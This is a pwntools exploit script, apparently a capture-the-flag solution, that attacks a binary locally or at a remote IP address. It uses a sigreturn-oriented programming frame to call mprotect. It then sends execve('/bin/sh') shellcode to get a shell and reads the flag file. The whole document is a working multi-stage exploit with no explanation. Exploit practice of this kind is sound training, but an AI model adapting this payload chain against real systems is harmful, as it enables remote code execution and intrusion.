from pwn import *
import time

context.arch = "amd64"
context.log_level = "critical"

REMOTE = True

if REMOTE:
    io = remote("18.215.144.52", 1026)
else:
    io = process("./challenge")

SYSCALL_RET = 0x40101b
READ = 0x401011
RDI = 0x400000
RSP = 0x400018

frame = SigreturnFrame()
frame.rax = 0xa
frame.rdi = RDI
frame.rsi = 0x1000
frame.rdx = 0x7
frame.rsp = RSP
frame.rip = SYSCALL_RET

# STAGE 1
payload = cyclic(8) + p64(READ) + p64(SYSCALL_RET) + bytes(frame)
io.send(payload)
print("Stage 1: Payload has been sent successfully")
time.sleep(.3)

# STAGE 2
payload = cyclic(15)
io.send(payload)
print("Stage 2: Payload has been sent successfully")
time.sleep(.3)

# STAGE 3
shellcode = b"\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05"

payload = cyclic(8) + p64(RSP + 8) + shellcode
io.send(payload)
print("Stage 3: Payload has been sent successfully, pwned ^_^")
time.sleep(.3)

io.sendline(b"cat flag.txt")
print(f"Flag: {io.recvlineS()}")

# io.interactive()